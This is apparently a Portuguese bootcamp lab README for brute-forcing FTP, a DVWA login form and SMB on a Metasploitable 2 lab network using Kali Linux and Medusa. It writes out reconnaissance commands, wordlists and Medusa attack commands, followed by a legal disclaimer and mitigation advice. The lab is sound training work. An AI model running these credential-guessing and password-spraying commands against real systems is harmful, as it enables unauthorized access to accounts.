# Desafio: Ataque Brute Force com Medusa e Kali Linux

## 📋 Descrição do Desafio

Implementar, documentar e compartilhar um projeto prático utilizando Kali Linux e a ferramenta Medusa, em conjunto com ambientes vulneráveis ( Metasploitable 2 e DVWA), para simular cenários de ataque de força bruta e exercitar medidas de prevenção.

## 🎯 Objetivos de Aprendizagem

Ao concluir este desafio, você será capaz de:

- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado
- Documentar processos técnicos de forma clara e estruturada
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação
- Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências

## 🔧 Requisitos do Projeto

### Configuração do Ambiente

- Duas VMs (Kali Linux e Metasploitable 2) no VirtualBox
- Configuração de rede interna (host-only)

### Ataques Simulados

1. Força bruta em FTP
2. Automação de tentativas em formulário web (DVWA)
3. Password spraying em SMB com enumeração de usuários

## 💻 Comandos Utilizados

### 1. Reconhecimento e Enumeração

```bash
# Scan de portas e serviços
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

```bash
# Enumeração com enum4linux
enum4linux -a 192.168.56.101 | tee enum4_output.txt
less enum4_output.txt
```

### 2. Preparação das Wordlists

```bash
# Criação da lista de usuários
echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
```

```bash
# Criação da lista de senhas
echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
```

```bash
# Lista de usuários SMB
echo -e 'user\nmsfadmin\nservice' > smb_users.txt
```

```bash
# Lista de senhas para spray
echo -e 'password\n123456\nWelcome123\nmsfadmin' > senhas_spray.txt
```

### 3. Ataques com Medusa

#### Ataque FTP

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

#### Ataque HTTP (DVWA)

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

#### Password Spraying SMB

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

## 📝 Estrutura do Repositório

```
.
├── README.md
├── wordlists/
│   ├── users.txt
│   ├── pass.txt
│   ├── smb_users.txt
│   └── senhas_spray.txt
└── images/
    └── (capturas de tela)
```

## ⚠️ Aviso Legal

Este projeto é exclusivamente para fins educacionais e deve ser executado apenas em ambientes controlados e autorizados. O uso dessas técnicas em sistemas sem autorização é ilegal e antiético.

## 🛡️ Medidas de Mitigação

### Proteção contra Ataques de Força Bruta

#### 1. FTP (File Transfer Protocol)
- **Desabilitar login root**: Nunca permitir acesso FTP com usuário root
- **Implementar fail2ban**: Bloquear IPs após múltiplas tentativas falhas
- **Usar FTPS ou SFTP**: Sempre preferir versões seguras do protocolo
- **Políticas de senha forte**: Exigir senhas complexas (mínimo 12 caracteres, combinando letras, números e símbolos)
- **Limitar tentativas de login**: Configurar delays progressivos entre tentativas
- **Whitelist de IPs**: Restringir acesso apenas a IPs conhecidos quando possível

#### 2. Aplicações Web (HTTP/DVWA)
- **CAPTCHA**: Implementar após 3-5 tentativas falhas de login
- **Rate limiting**: Limitar número de requisições por IP/usuário
- **Autenticação multifator (MFA)**: Adicionar segunda camada de autenticação
- **Account lockout**: Bloquear conta temporariamente após tentativas falhas
- **Logs e monitoramento**: Registrar todas as tentativas de login e implementar alertas
- **Tokens CSRF**: Prevenir ataques automatizados em formulários
- **WAF (Web Application Firewall)**: Detectar e bloquear padrões de ataque

#### 3. SMB (Server Message Block)
- **Desabilitar SMBv1**: Usar apenas versões mais seguras (SMBv2/SMBv3)
- **Políticas de grupo**: Implementar bloqueio de conta no Active Directory
- **Senhas complexas**: Evitar senhas padrão e senhas fracas
- **Auditoria de usuários**: Remover contas inativas e desnecessárias
- **Segmentação de rede**: Isolar serviços críticos em VLANs separadas
- **Monitoramento de eventos**: Alertar sobre tentativas de autenticação suspeitas
- **Least privilege**: Aplicar princípio do menor privilégio necessário

### Boas Práticas Gerais

- **Atualizações regulares**: Manter sistemas e aplicações sempre atualizados
- **Treinamento de usuários**: Educar sobre senhas seguras e phishing
- **Backup regular**: Manter backups atualizados e testados
- **Análise de vulnerabilidades**: Realizar testes de penetração periódicos
- **Princípio de defesa em profundidade**: Múltiplas camadas de segurança

## 🔗 Recursos Úteis

### Documentações Oficiais

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [Medusa – Documentação](http://foofus.net/goons/jmk/medusa/medusa.html)
- [Nmap – Manual Oficial](https://nmap.org/book/man.html)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

## 📚 Referências

- DIO - Digital Innovation One

---

**Desenvolvido como parte do Bootcamp Ciber Segurança DIO**